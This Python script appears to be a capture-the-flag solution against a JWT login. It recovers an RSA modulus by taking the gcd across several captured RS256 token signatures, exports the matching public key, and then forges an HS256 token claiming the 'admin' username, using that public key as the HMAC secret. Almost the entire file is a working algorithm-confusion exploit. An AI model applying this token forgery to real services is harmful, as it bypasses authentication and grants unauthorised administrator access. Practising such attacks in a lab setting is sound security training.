import base64
import gmpy2
from Crypto.Signature import pkcs1_15
from Crypto.Hash import SHA256
from base64 import urlsafe_b64encode, urlsafe_b64decode
import jwt
from Crypto.PublicKey import RSA

'''
Compute RSA Public Key - (N, e)
'''
def initialize(message, c_or_m):
    if c_or_m == 'c':
        return gmpy2.mpz(int(base64.urlsafe_b64decode(message).hex(), 16))
    elif c_or_m == 'm':
        return gmpy2.mpz(int(pkcs1_15._EMSA_PKCS1_V1_5_ENCODE(SHA256.new(message.encode()), 256).hex(), 16))

ciphertext = {
    0 : "AMpJDyvv2burdO35LvbtykwdhCOItlRv0pyvE3WB7ysDqrpmy0ZbIJfkvddHLBMTLad9jgz9DV9B_Y4aPNIAs6_QibK22BoPMwmbhE_qw88rMjpf5Ph-SmmuTb51VLz4gO9QEX03AekBD5VHYHttuyln4AJdZ8y0-VUCvlyi_lEDqmRPpCnCUN1tuK6KcnKVa0IfaB1kTKzBFEFtL3oPrC9Qtp5bkYxrPXslhYhlCHRDjL_TrGn_A5g5CwONHFNczVNRig5oSyY6XV49vAJrxWMUeNKXkU49JLgGYF01tQvRDPi7m7gtTVjhQLVTV_-qkYuVbGr2bgx2PhSheA2Xcg==",
    1 : "R8QnOGx9aBt7Hjh6wXG3JmqhutNB7a7oCNWZvVUg4bhtdVWpG1WyehCczOnBs-uLcZnXg4AO6ppf4Qt2p70s7dCKsSv3YJ2L_BBXFWjlgSmNlfxTznGgMY49_0l8hmSB4A1TRbIrxLmncZmmHiTt7Fm-sUNqCl097myfu-54sMNunZktpNrQfj9PYrQuDf2HmEfw-7uDGQPThSl0vjTBQDW3adnRZOKtQ1n-xDucEVy5twxS6Tn8LNs25xn7u2ts8qFrVHFe_WlihBmZgGjmgjvkbhcKinQ3uLFx5XRw_kpQ1yjN9NMZcELV_XeGLExuRIS4TundCGYLuDIp8NKLhQ==",
    2 : "BfwxVR2DBeti1TdWm37Mj9V6hYOz-tdTisf7Lu98tz-jQgHWDUkM0RDzjUYha6wH7ZCqXGn8Les4Lk-k5zbpT_flEtu6e_w5wEKJbm2-i6OeZxZLiXLP0aOs-sSVmkdcRR-3tGWSuA6SL4VQokZUTv-4Td5FrurU6NKi6ZuwSWk8F5O6MIBi7Boncv6SnWtH93GsHCeXlVmQKvSWH0dPJDS00UwvtNSQ9moF0zhuBWIZqhjS89VWwWt5LJnbtzkEGSM5MxYsk-F8xKntwO9oiPYWeK-mo9JvGg6RnM5Poanzzbmcdw055X1wseBS2Pbv1pPEN0g6mHKuRQoc7slWEA==",
    3 : "M74GetHK2cRPuaB9HFrXYhMX8iAaQmyEOCC2xIGaYDTgZ0EfbcyST5acMfHmlLZ4ylsCVzIc3uoRWHnKo-KTTn4ECCWpdAzbzKvlpxurm4zF1b1oAfsnw7Mdv68XR1X7FEpnGT2FnXJNTbhEOwc2Bb8qgy8lYVXhIKuL-0734JWjs9V4V3UnC2TBcXfwRR1xddeXzEYoyGAm_vIY9T051jTT0OljDruQhIDH1kPTuBrJNXuedDlIc9BXZzPcBsKPdRhFb7EET8C-UheTwDM8tLAykWNcegf0-VVqP92bC80scJEgKV7HHtPU6nh7FA0_i49QSMndRsFB_96RjdTSQA=="
}

plaintext = {
    0 : "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZmxhZzEiOiJDTlN7Slc3XzE1X04wN19hXzkwMGRfUExBQ0VfNzBfSDFERV81ZWNyRTc1fSIsImV4cCI6MTY4NjU4Mzc1OX0",
    1 : "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZmxhZzEiOiJDTlN7Slc3XzE1X04wN19hXzkwMGRfUExBQ0VfNzBfSDFERV81ZWNyRTc1fSIsImV4cCI6MTY4NjU4MzgwNX0",
    2 : "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZmxhZzEiOiJDTlN7Slc3XzE1X04wN19hXzkwMGRfUExBQ0VfNzBfSDFERV81ZWNyRTc1fSIsImV4cCI6MTY4NjU4Mzg1MH0",
    3 : "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZmxhZzEiOiJDTlN7Slc3XzE1X04wN19hXzkwMGRfUExBQ0VfNzBfSDFERV81ZWNyRTc1fSIsImV4cCI6MTY4NjU4Mzg4Mn0"
}

c = {}
m = {}
for i in range(4):
    c[i] = initialize(ciphertext[i], 'c')
    m[i] = initialize(plaintext[i], 'm')


e = gmpy2.mpz(65537) # The default parameter in openssl
a_N = c[0]**e - m[0]
b_N = c[1]**e - m[1]
c_N = c[2]**e - m[2]

n = gmpy2.gcd(a_N, b_N, c_N)


'''
Generate PEM File about RSA Public Key
'''
n = 0x8ffcd5ae700b26f96316817101f254071b082b209196371eabf52d9a5e80eb64d5f4c4a1533e147f3c27b7e941622c25db41f21f502f6fd94d4b994b9448d824f24d27845da8cf5f8e10ddd1ac05ef54c490aaa7ac028efafe205d0633c62cd72ff3f874497a67c5458adaec91be0859e82a300f345ecd007115b9cb653e6b9ba670ea61e31b4b4b13bcba8cb324777e751c6b9fe531f5c6d61dd459674e57d08c03e1202f66b835220d097a9429fa5dcc22f8fbf80ddb1bb0b59ad98d4b462619ec3642ea1f6fdb7420b9602b4a8c4f66aaa0932b36d7ab4102392cd71803076acf2947cd253ea5580a0c1228ddd7647ef3d6e7c43f3d5d9654cf0d47d390d1
e = 0x10001
key_params = (n, e)
key = RSA.construct(key_params)
f = open('./rsa-public-key.pem', 'w')
f.write(key.exportKey().decode())
f.close()




'''
Create Signature
'''
import jwt
import hashlib
import hmac
key = b"-----BEGIN PUBLIC KEY-----\n\
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAj/zVrnALJvljFoFxAfJU\n\
BxsIKyCRljceq/Utml6A62TV9MShUz4Ufzwnt+lBYiwl20HyH1Avb9lNS5lLlEjY\n\
JPJNJ4RdqM9fjhDd0awF71TEkKqnrAKO+v4gXQYzxizXL/P4dEl6Z8VFitrskb4I\n\
WegqMA80Xs0AcRW5y2U+a5umcOph4xtLSxO8uoyzJHd+dRxrn+Ux9cbWHdRZZ05X\n\
0IwD4SAvZrg1Ig0JepQp+l3MIvj7+A3bG7C1mtmNS0YmGew2Quofb9t0ILlgK0qM\n\
T2aqoJMrNterQQI5LNcYAwdqzylHzSU+pVgKDBIo3ddkfvPW58Q/PV2WVM8NR9OQ\n\
0QIDAQAB\n\
-----END PUBLIC KEY-----\n"
header = '{"alg": "HS256", "typ": "JWT"}'
payload = '{"username":"admin","flag1":"CNS{JW7_15_N07_a_900d_PLACE_70_H1DE_5ecrE75}","exp":1786583759}'
header = base64.urlsafe_b64encode(bytes(header, "utf-8")).decode().replace("=", "").encode()
payload = base64.urlsafe_b64encode(bytes(payload, "utf-8")).decode().replace("=", "").encode()
sig = hmac.new(key, header + b'.' + payload, hashlib.sha256).digest().strip()
sig = base64.urlsafe_b64encode(sig).decode().replace("=", "")
jwt = '{}.{}.{}'.format(header.decode(), payload.decode(), sig)
print(jwt)